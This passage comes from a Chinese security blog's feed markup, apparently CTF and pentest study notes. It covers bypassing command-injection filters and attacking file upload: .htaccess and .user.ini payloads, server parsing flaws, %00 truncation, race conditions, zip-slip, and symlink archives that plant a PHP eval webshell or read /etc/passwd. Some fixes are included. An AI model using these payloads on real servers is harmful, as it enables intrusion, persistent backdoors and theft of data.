title="绕过关键字过滤"></a>绕过关键字过滤</h4><ol><li><p>插入\</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat = ca\t = c\at = \cat</span><br></pre></td></tr></table></figure></li><li><p>插入空字符</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls = l&#x27;&#x27;s = l&quot;&quot;s = l&#x27;s&#x27; = l&quot;s&quot; （只要插入成对的单双引号就可以）</span><br><span class="line">= l$1s = l$&#123;asdfa&#125;s = l``s =  l$(``)s  =  l$(&#x27;&#x27;)s = l$(&quot;&quot;)s</span><br></pre></td></tr></table></figure><blockquote><p>$1~$9为脚本参数</p><p>${xx}代表变量值,只要xx没有定义即可</p><p>内敛执行空命令</p></blockquote></li><li><p>变量拼接</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=c;b=at;$a$b file</span><br></pre></td></tr></table></figure><blockquote><p>如果；被过滤，可以用%0a或者&amp;&amp;（需要url编码）代替</p></blockquote></li><li><p>其他命令代替</p></li><li><p>文件名用通配符</p></li></ol><h4 id="输出重定向符绕过"><a href="#输出重定向符绕过" class="headerlink" title="输出重定向符绕过"></a>输出重定向符绕过</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-4-8-ubuntu:~$ echo  $PS2</span><br><span class="line"><span class="meta prompt_">&gt;</span></span><br></pre></td></tr></table></figure><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><ol><li><code>$&#123;IFS&#125;</code></li><li><code>$IFS</code>+空字符</li><li>重定向符</li><li><code>&#123;cat,flag.php&#125;</code></li><li>url参数编码，空格%20，制表符%09</li></ol><h4 id="目录分隔符-绕过"><a href="#目录分隔符-绕过" class="headerlink" title="目录分隔符/绕过"></a>目录分隔符<code>/</code>绕过</h4><ol><li><p>多条命令执行，先cd到目的目录，再执行cat等命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ..;cd ..;cd ..;cat flag</span><br></pre></td></tr></table></figure><blockquote><p>如果；被过滤，可以用%0a或者&amp;&amp;（需要url编码）代替</p></blockquote></li><li><p>截取环境变量</p><p><code>env</code>或者<code>printenv</code>：打印环境变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ echo $&#123;PWD:0:1&#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure></li></ol><h4 id="重定向写文件绕过"><a href="#重定向写文件绕过" class="headerlink" title="重定向写文件绕过"></a>重定向写文件绕过</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;shell&quot; &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><h4 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat `ls`</span><br><span class="line">cat $(ls)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;读取当前目录的所有文件</span></span><br><span class="line">将ls的输出作为cat的输入进行执行。</span><br></pre></td></tr></table></figure><h4 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h4><h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><ol><li><p>ls输出的结果是按照字典排序的</p><p><img src="/../images/image-20221017101847464.png" alt="image-20221017101847464"></p></li><li><p>\放在指令的最末端，表示指令连接下一行。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ cat \</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">1</span></span><br><span class="line">da</span><br></pre></td></tr></table></figure></li><li><p><code>ls -t &gt; a</code>将文件名（命令）按时间重定向到脚本文件a中，<code>sh a</code>执行脚本a。</p><p>注：将执行的命令反序生成。<code>\\</code>是为了转义，让文件名带上\</p><img src="../images/1650186228_625bd7f4927774ad69919.png!small" alt="img" style="zoom:150%;" /></li><li><p>单独一个<code>*</code>会将目录下的文件名按照字典排序拼接成命令执行，第一个文件名为命令，其他为该命令的参数</p><p><code>echo hello</code></p><p><img src="/../images/image-20221017102117317.png" alt="image-20221017102117317"></p><p>在这个基础上<code>*o</code>也可以，就是取出满足正则*o的文件名拼接成命令执行。</p><p><img src="/../images/image-20221017102322441.png" alt="image-20221017102322441"></p></li></ol><h5 id="UUCTF-2022-新生赛-ezrce"><a href="#UUCTF-2022-新生赛-ezrce" class="headerlink" title="[UUCTF 2022 新生赛]ezrce"></a>[UUCTF 2022 新生赛]ezrce</h5><p>给出了一个命令执行接口，测试之后发现长度限制为6,正常思路</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">a</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112107946.png" alt="image-20221107112107946"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112233686.png" alt="image-20221107112233686"></p><p>然后尝试访问&#x2F;tmp&#x2F;a，服务器没有报错，说明<code>&gt;a</code>其实是执行成功了的。</p><ul><li><p>解法1</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">cp</span></span></span><br><span class="line">* /* .</span><br></pre></td></tr></table></figure><p>第一条命令创建一个文件名为cp的文件</p><p>第二条命令执行<code>cp /* .</code>，将根目录下的文件复制到当前目录下，然后访问&#x2F;tmp&#x2F;flag即可</p><p><img src="/../images/image-20221107113239425.png" alt="image-20221107113239425"></p></li><li><p>解法2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">nl</span></span></span><br><span class="line">* /*&gt;a</span><br></pre></td></tr></table></figure><p>第一条命令创建一个文件名为nl的文件</p><p>第二条命令执行<code>nl /*&gt;a</code>，读取根目录下所有文件的内容重定向到a中，然后访问&#x2F;tmp&#x2F;a即可</p><p><img src="/../images/image-20221107113608245.png" alt="image-20221107113608245"></p></li><li><p>解法3</p><p>脚本直接写🐎</p></li></ul><h4 id="无数字绕过"><a href="#无数字绕过" class="headerlink" title="无数字绕过"></a>无数字绕过</h4><p>安洵杯2020[Web-Bash-Vino0o0o]</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$test</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$white_list</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&#x27;$&#123;#&#125;\\(&lt;)\&#x27;0&#x27;</span>); </span><br><span class="line">    <span class="variable">$char_list</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$test</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$char_list</span> <span class="keyword">as</span> <span class="variable">$c</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$c</span>,<span class="variable">$white_list</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Cyzcc&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$test</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只能用$</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞危害–攻击面"><a href="#漏洞危害–攻击面" class="headerlink" title="漏洞危害–攻击面"></a>漏洞危害–攻击面</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Webshell类：脚本文件</span><br><span class="line">XSS类：svg，html，pdf文件,如果后端为nodejs，可以xss to rce</span><br><span class="line">SSRF类：PDF</span><br><span class="line">XXE类：docx、xlsx，svg</span><br><span class="line">RCE类：phar文件，配合文件读取反序列化攻击 # 鸡肋，要有源码，还要有危险方法</span><br><span class="line">目录穿越：文件覆盖，ssh公钥</span><br></pre></td></tr></table></figure><p><a href="https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf">PDF解析器html&#x2F;XSS 实现SSRF - 火线 Zone-安全攻防社区</a></p><h1 id="PHP相关代码"><a href="#PHP相关代码" class="headerlink" title="PHP相关代码"></a>PHP相关代码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [&#x27;file&#x27;]是Content-Disposition中name的值</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] 客户端文件名称</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] 文件的MIME类型       image/jpeg,image/png</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] 文件大小 单位字节</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后再服务器端临时文件名，可以在php.ini中指定</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 加入文件头绕过：GIF89a  </span></span><br><span class="line"><span class="title function_ invoke__">getimagesize</span>()  图片大小</span><br><span class="line"><span class="title function_ invoke__">exif_imagetype</span>()  图片类型</span><br></pre></td></tr></table></figure><p>上传过程</p><blockquote><p>在文件上传结束后，文件默认被储存在临时文件夹中，这时必须把他从临时目录中删除或移动到其他地方，否则，脚本运行完毕后，自动删除临时文件，可以使用<code>copy或</code>者<code>move_uploaded_file</code>两个函数。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">       <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><ul><li><p>中间件配置不当，导致可以解析其他脚本后缀</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line">.php3 .php4 .php5  .pht  .phtml  .phar  .shtml </span><br><span class="line">    </span><br><span class="line"><span class="comment"># .shtml    </span></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;!--<span class="comment">#exec cmd=&quot;whoami&quot; --&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">    </span><br><span class="line"><span class="comment"># jsp    </span></span><br><span class="line">.jsp .jspa .jsps .jspx </span><br><span class="line">    </span><br><span class="line"><span class="comment"># .net</span></span><br><span class="line">.asp  .asa .cdx  .cer  .aspx .asmx  .ashx</span><br></pre></td></tr></table></figure></li><li><p>可以上传相关配置文件</p><ul><li><p>.htaccess</p><p><a href="https://blog.csdn.net/solitudi/article/details/116666720">CTF.htaccess的使用技巧总结_.htaccess ctf_Y4tacker的博客-CSDN博客</a></p><p>只能用于Apache</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 当文件名中包含shell时，该文件会被Apache当作php解析</span></span><br><span class="line">&lt;FilesMatch &quot;shell&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#.png文件也可以执行php程序</span></span><br><span class="line">AddType application/x-httpd-php .png </span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展名为.yyy的文件作为 CGI 脚本来处理</span></span><br><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .yyy</span><br></pre></td></tr></table></figure><p>修复</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在配置文件中将AllowOverride ALL改为AllowOverride None</span><br></pre></td></tr></table></figure></li><li><p>.user.ini</p><p>使用条件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache和Nginx都可以，只需满足：</span><br><span class="line">服务器脚本语言为PHP 服务器使用CGI</span><br><span class="line">FastCGI模式</span><br><span class="line">上传目录下要有可执行的php文件</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=file_name  <span class="comment">#表示在加载第一个PHP代码之前先行预加载该配置所指示的PHP文件。</span></span><br><span class="line"></span><br><span class="line"><span class="attr">auto_append_file</span>=file_name  <span class="comment">#表示在加载第一个PHP代码之后执行预加载该配置所指示的PHP文件。</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>过滤不当</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">点绕过、空格绕过、后缀双写绕过、后缀大小写绕过</span><br></pre></td></tr></table></figure></li><li><p>Apache解析漏洞</p><ul><li><p>从右往左解析漏洞</p><p>产生原因：</p><p>前提：<strong>php作为apache的一个子模块来运行</strong></p><p><img src="/../images/image-20230617172156170.png" alt="image-20230617172156170"></p><p>apache支持一个文件拥有多个后缀，并为不同后缀执行不同的指令，如果运维人员给<code>.php</code> 后缀增加了处理器</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure><p>Apache会从右向左，依次识别后缀，直到遇到自己能解析的文件名为止。那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code> 后缀的文件即将被识别成 PHP 文件。</p><p>假设上传的文件名为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xxxx.php.xyz</span><br></pre></td></tr></table></figure><p>这时候最后一个可识别的扩展为.php，会将其作为php文件进行解析，轻松绕过<strong>黑白名单</strong>。</p><p>vulhub复现</p><p><img src="/../images/image-20230617172318530.png" alt="image-20230617172318530"></p></li></ul><p>本地cgi模式复现</p><p><img src="/../images/image-20230617172525788.png" alt="image-20230617172525788"></p><p><img src="/../images/image-20230617172355992.png" alt="image-20230617172355992"></p><ul><li><p>HTTPD换行解析漏洞–CVE-2017-15715</p><p>产生原因：</p><p>配置中的正则缺陷</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;[^ .]+\.php$&quot;</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>正则表达式中$不仅匹配字符串结尾位置，也可以匹配\n 或 \r，从而导致可以上传<code>.php\n</code>绕过<strong>黑名单</strong>校验，同时也可以被作为PHP文件解析。（不能是<code>.php\r\n</code>）</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上传：1.php\x0a</span><br><span class="line">访问：1.php%0a</span><br></pre></td></tr></table></figure></li></ul><p>上述漏洞修复：因为Apache的解析漏洞是由于畸形扩展名和畸形文件名导致的，所以使用白名单，并对文件重命名，文件就不会存在畸形字符和多扩展名的情况。</p><p>参考如下代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]会自动把换行去掉</span></span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...其他检查</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, [<span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>], <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="variable">$new_name</span> = <span class="string">&#x27;./upload/&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$new_name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="图片白名单绕过"><a href="#图片白名单绕过" class="headerlink" title="图片白名单绕过"></a>图片白名单绕过</h1><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul><li>php版本&lt;5.3.4</li><li>magic_quotes_gpc关闭</li><li>保存的文件名可控</li></ul><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure><p>后端使用<code>move_uploaded_file</code>来移动文件，<code>move_uploaded_file</code>函数底层为c语言，遇到0x00会截断（字符串结束标志）</p><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?save_path=../upload/shell.php%<span class="number">00</span></span><br><span class="line"></span><br><span class="line">filename=shell.jpg</span><br></pre></td></tr></table></figure><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">    <span class="comment"># move_uploaded_file成功后才判断是否合法</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>服务端先将上传的文件写入，再判断是否合法，通过条件竞争在文件删除前访问webshell写入新的webshell即可。</p><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h4><ul><li><p>5.x  , 6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 文件夹解析漏洞</span><br><span class="line">会将 *.asp/目录下的所有文件当成Asp解析</span><br></pre></td></tr></table></figure></li><li><p>6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 分号截断漏洞</span><br><span class="line">默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析，原理是服务器默认不解析; 号及其后面的内容，相当于截断。</span><br></pre></td></tr></table></figure></li></ul><p>修复方案：IIS服务器本身缺陷，升级版本&#x2F;打补丁</p><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><ul><li><p>文件类型错误解析漏洞（IIS7.x版本在Fast-CGI运行模式下也存在）</p><p>产生原因：</p><p><code>FastCGI</code>与<code>PHP</code>对PATH_INFO处理的差异。 </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload</span></span><br><span class="line">/example.gif/.php</span><br></pre></td></tr></table></figure><p>修复：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在php.ini中设置fix_pathinfo=0 或者设置security.limit_extensions = .php</span><br><span class="line">或者</span><br><span class="line">在nginx的配置文件中设置fastcgi_spilt_path_info  ^(.+\.php)(.*)$;</span><br></pre></td></tr></table></figure></li><li><p>空字节解析漏洞（CVE-2013-4547）</p><p>受影响版本：0.841<del>1.4.3&#x2F;1.5.0</del>1.5.7</p><p>产生原因：</p><p>nginx配置不当</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line">当用户请求info.jpg%00.php时，因为info.jpg%00.php能够匹配正则&quot;.php$&quot;，所以可以进入该<span class="section">location</span>块。</span><br><span class="line">但是nginx在解析文件名时被%<span class="number">00</span>截断，导致以为请求的文件是info.jpg并发给fastcgi，所以fastcgi就将info.jpg当作php文件进行解析了。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload</span></span><br><span class="line">上传文件：info.jpg</span><br><span class="line">请求文件：info.jpg%<span class="number">00</span>.php</span><br></pre></td></tr></table></figure><p>修复：升级版本</p></li></ul><h3 id="配合文件包含"><a href="#配合文件包含" class="headerlink" title="配合文件包含"></a>配合文件包含</h3><ul><li><p>图片🐎</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  绕过宽高检查</span></span><br><span class="line"><span class="comment">#define width 1</span></span><br><span class="line"><span class="comment">#define height 1</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a></p><p>用数据量小的图片，比如随便截一张很小的图</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">普通：copy,直接插入</span><br><span class="line">二次渲染：找到前后图片中没有发生变化的hex数据，替换为木马</span><br></pre></td></tr></table></figure></li><li><p>文件包含trick</p></li></ul><h3 id="配合文件读取反序列化"><a href="#配合文件读取反序列化" class="headerlink" title="配合文件读取反序列化"></a>配合文件读取反序列化</h3><p>上传任意后缀的phar格式的文件，配合文件读取用<code>phar://</code>解析</p><h1 id="压缩文件解压问题"><a href="#压缩文件解压问题" class="headerlink" title="压缩文件解压问题"></a>压缩文件解压问题</h1><p>服务端会对上传的压缩包进行解压，可以构造恶意压缩包攻击</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>Linux软链接</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /etc/passwd test</span><br><span class="line">zip -y passwd.zip test  # -y 保证解压出来的还是软链接</span><br></pre></td></tr></table></figure><h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><ul><li><p>通过构造压缩文件的文件名，造成目录穿越</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="comment"># the name of the zip file to generate</span></span><br><span class="line">zf = zipfile.ZipFile(<span class="string">&#x27;out.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># the name of the malicious file that will overwrite the origial file (must exist on disk)</span></span><br><span class="line">fname = <span class="string">&#x27;sec_test.txt&#x27;</span></span><br><span class="line"><span class="comment">#destination path of the file</span></span><br><span class="line">zf.write(fname, <span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../tmp/sec_test.tmp&#x27;</span>)</span><br></pre></td></tr></table></figure><p>所有已发现受<code>Zip Slip</code>影响的项目:<a href="https://github.com/snyk/zip-slip-vulnerability">https://github.com/snyk/zip-slip-vulnerability</a></p><p><strong>注</strong>：如果用的是命令<code>unzip</code>来解压，这种方法就没用了，因为<code>unzip</code> 默认跳过文件名中的<code>../</code></p></li><li><p>软链接的妙用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个软链接指向网站目录</span></span><br><span class="line">ln -s /var/www/html test</span><br><span class="line">zip -y 1.zip test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个与软链接同名的目录，并在该目录下创建木马文件</span></span><br><span class="line">mkdir a &amp;&amp; cd a </span><br><span class="line">mkdir test</span><br><span class="line">echo &#x27;&lt;?php @eval($_GET[1]); ?&gt;&#x27; &gt; test/shell.php</span><br><span class="line">chmod 777 test/shell.php</span><br><span class="line">zip -r 2.zip test</span><br></pre></td></tr></table></figure><p>然后先上传1.zip，解压得到软链接<code>test</code>，再上传2.zip，解压得到test目录和shell.php，因为test指向&#x2F;var&#x2F;www&#x2F;html,所以shell.php实际上是被解压到网站目录下</p></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>From：代码审计知识星球</p><p>修改压缩包二进制字节，让压缩包解压过程出错，但是出错前已解压部分即为webshell。（出错后捕获异常，程序中止，如果开发人员没有对已解压部分进行校验，那么已解压出的webshell就可以留在服务端中）</p><p><a href="https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html">https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html</a></p><h1 id="上传接口寻找"><a href="#上传接口寻找" class="headerlink" title="上传接口寻找"></a>上传接口寻找</h1><ul><li><p>通过观察命名来fuzz接口</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">uploadImg.cspx</span><br><span class="line">uploadfile.cspx</span><br><span class="line">uploadtest.cspx</span><br><span class="line"></span><br><span class="line">upload_test.cspx</span><br><span class="line">upload_2018.php</span><br><span class="line"></span><br><span class="line">upload2019.php</span><br><span class="line">upload2020.jsp</span><br></pre></td></tr></table></figure></li><li><p>上传接口测试</p></li></ul><p>From <a href="https://y4er.com/posts/pentest-idea-sharing-file/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">https://y4er.com/posts/pentest-idea-sharing-file/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0</a></p><p><img src="/../images/image-20230605161933817.png" alt="image-20230605161933817"></p><h1 id="上传后问题"><a href="#上传后问题" class="headerlink" title="上传后问题"></a>上传后问题</h1><h3 id="脚本文件访问403"><a href="#脚本文件访问403" class="headerlink" title="脚本文件访问403"></a>脚本文件访问403</h3><p>尝试其他后缀</p><h3 id="没有执行权限"><a href="#没有执行权限" class="headerlink" title="没有执行权限"></a>没有执行权限</h3><p>表现：访问时文件直接下载</p><p>尝试目录穿越，跳到可以执行脚本语言的目录</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">///../../../</span><br></pre></td></tr></table></figure><blockquote><p>以&#x2F;&#x2F;&#x2F;开头是因为可能会转码，导致写入失败</p></blockquote><h3 id="文件路径寻找"><a href="#文件路径寻找" class="headerlink" title="文件路径寻找"></a>文件路径寻找</h3><p>From <a 